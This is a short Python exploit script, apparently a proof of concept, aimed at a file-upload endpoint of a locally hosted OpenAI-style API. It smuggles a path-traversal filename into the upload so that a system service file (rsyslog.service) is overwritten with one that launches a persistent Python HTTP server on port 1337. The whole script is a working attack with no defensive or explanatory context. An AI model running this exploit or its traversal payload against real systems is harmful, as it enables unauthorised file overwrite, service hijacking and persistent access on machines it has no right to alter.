import requests

url = "http://127.0.0.1:7861/v1/files?purpose=assistants"

service_path = "../../../../../../../../../../etc/systemd/system/rsyslog.service"

service_content = """[Unit]
Description=Evil Python HTTP Server
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -m http.server 1337
ExecStartPost=/bin/echo "HTTP server running on port 1337"
Restart=always

[Install]
WantedBy=multi-user.target
"""

files = {
    "file": (service_path, service_content, "text/plain")
}
r = requests.post(url, files=files)
print("[+] rsyslog.service hijacked and uploaded:", r.status_code)

